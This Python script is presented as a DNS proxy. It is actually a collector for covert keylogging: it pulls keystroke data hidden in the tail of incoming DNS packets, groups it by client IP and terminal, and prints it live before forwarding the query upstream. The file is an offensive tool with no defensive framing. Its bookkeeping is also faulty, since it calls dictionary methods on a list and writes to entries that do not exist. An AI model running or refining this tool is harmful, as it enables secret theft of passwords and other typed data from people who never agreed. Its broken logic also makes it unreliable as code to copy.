import argparse
import os
import socket
import time

import yaml
from dnslib import QTYPE, RCODE, DNSRecord
from dnslib.server import BaseResolver, DNSHandler, DNSLogger, DNSServer


keys = {}
PAYLOAD_LEN = int(os.environ["PAYLOAD_LEN"])


class ProxyResolver(BaseResolver):
    def __init__(self, address, port, timeout=0, strip_aaaa=False):
        self.address = address
        self.port = port
        self.timeout = timeout
        self.strip_aaaa = strip_aaaa

    def resolve(self, request, handler):
        try:
            if self.strip_aaaa and request.q.qtype == QTYPE.AAAA:
                reply = request.reply()
                reply.header.rcode = RCODE.NXDOMAIN
            else:
                if handler.protocol == "udp":
                    proxy_r = request.send(
                        self.address, self.port, timeout=self.timeout
                    )
                else:
                    proxy_r = request.send(
                        self.address, self.port, tcp=True, timeout=self.timeout
                    )
                reply = DNSRecord.parse(proxy_r)
        except socket.timeout:
            reply = request.reply()
            reply.header.rcode = getattr(RCODE, "NXDOMAIN")

        return reply


class PassthroughDNSHandler(DNSHandler):
    def get_reply(self, data):
        host, port = self.server.resolver.address, self.server.resolver.port
        client_ip = str(self.client_address[0])
        if not keys.get(client_ip):
            keys[client_ip] = []

        try:
            payload = data[-PAYLOAD_LEN:]
            key_events = zip(payload[::2], payload[1::2])
            for tty, key in key_events:
                if not keys[client_ip].get(tty):
                    keys[client_ip][tty] = []
                keys[client_ip][tty].append(chr(key))

            res = {}
            for client_ip, tty_obj in keys.items():
                for tty_id, k in tty_obj.items():
                    res[client_ip][tty_id] = "".join(k)
            os.system("clear")
            for ip, tty_obj in res.items():
                print(f"[{ip}]")
                for tty_id, k in tty_obj.items():
                    print(f"(tty_{tty_id}): {k}")

        except Exception as e:
            print(e)
            pass

        data = bytearray(data[:-PAYLOAD_LEN])
        # add recursion byte
        data[2:4] = bytes.fromhex("0120")

        request = DNSRecord.parse(bytes(data))
        self.server.logger.log_request(self, request)
        response = send_udp(data, host, port)
        reply = DNSRecord.parse(response)
        self.server.logger.log_reply(self, reply)
        return response


def send_udp(data, host, port):
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(data, (host, port))
        response, _ = sock.recvfrom(8192)
        return response
    finally:
        if sock is not None:
            sock.close()


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="DNS Proxy")
    p.add_argument(
        "--port",
        "-p",
        type=int,
        default=53,
        metavar="<port>",
        help="Local proxy port (default:53)",
    )
    p.add_argument(
        "--address",
        "-a",
        default="",
        metavar="<address>",
        help="Local proxy listen address (default:all)",
    )
    p.add_argument(
        "--upstream",
        "-u",
        default="8.8.8.8:53",
        metavar="<dns server:port>",
        help="Upstream DNS server:port (default:8.8.8.8:53)",
    )

    p.add_argument(
        "--log",
        default="error",
        help="Log hooks to enable (default: +error)",
    )

    args = p.parse_args()

    dns, _, dns_port = args.upstream.partition(":")
    dns_port = int(dns_port or 53)

    print(
        "Starting Proxy Resolver (%s:%d -> %s:%d) [%s]"
        % (
            args.address or "*",
            args.port,
            dns,
            dns_port,
            "UDP",
        )
    )

    udp_server = DNSServer(
        ProxyResolver(dns, dns_port, timeout=5, strip_aaaa=False),
        port=args.port,
        address=args.address,
        logger=DNSLogger(args.log, prefix=True),
        handler=PassthroughDNSHandler,
    )
    udp_server.start()

    while udp_server.isAlive():
        time.sleep(1)
